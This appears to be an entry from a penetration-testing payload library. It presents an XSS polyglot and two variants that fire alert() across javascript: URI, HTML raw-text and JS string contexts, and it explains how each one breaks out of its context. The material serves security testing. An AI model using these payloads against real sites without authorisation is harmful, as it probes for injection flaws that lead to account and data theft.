---
title: XSS Polyglot (Multiple Contexts)
slug: xss-polyglot
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/polyglot, sink/innerHTML, sink/js-string, sink/href]
inbound: []
---

# XSS Polyglot (Multiple Contexts)

## Payload

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

## Variants

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"
 onmouseover=/*&lt;svg/*/onload=alert()//>

javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
```

## Context

Polyglots are designed to fire in multiple injection contexts simultaneously: a `javascript:` URI context (href/src/action), an HTML context after closing common consuming tags (`</title>`, `</style>`, `</script>`, `</xmp>`, `</textarea>`), and a JS string context (the `/*--` comment closes the outer expression). The payload is valid as a `javascript:` URL while also being valid as an HTML injection that closes raw-text elements. `<details open ontoggle=...>` is the alternative auto-fire handler. The third variant includes `/@PortSwiggerRes/` as a regex to avoid alert-argument pattern matching. Use as a first-probe canary across all injection contexts.

## Provenance

- Distilled from: `../../techniques/dom-xss/scriptless-attacks.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Scriptless Attacks](../../techniques/dom-xss/scriptless-attacks.md)
- [Consuming Tags and Hoisting](../../techniques/dom-xss/consuming-tags-and-hoisting.md)
- [Event Handler Matrix](../../techniques/dom-xss/event-handler-matrix.md)
